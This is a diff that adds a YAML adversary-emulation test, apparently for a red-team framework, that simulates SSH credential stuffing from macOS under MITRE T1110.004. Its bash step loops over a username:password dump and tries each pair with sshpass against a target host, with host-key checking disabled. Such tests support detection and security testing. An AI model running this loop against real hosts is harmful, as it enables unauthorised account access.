@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: SSH Credential Stuffing From MacOS
+description: |
+    Using username,password combination from a password dump to login over SSH.
+args:
+    - name: target_host
+      type: string
+      default: localhost
+uuid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.004: Credential Stuffing'
+requirements:
+    platforms:
+        - os: macos
+steps:
+    - name: ssh-credential-stuffing-from-macos
+      inline: |
+        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
+        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@{{.Args.target_host}};done
+      executor: bash
+      cleanup:
+        inline: ""
+        executor: bash
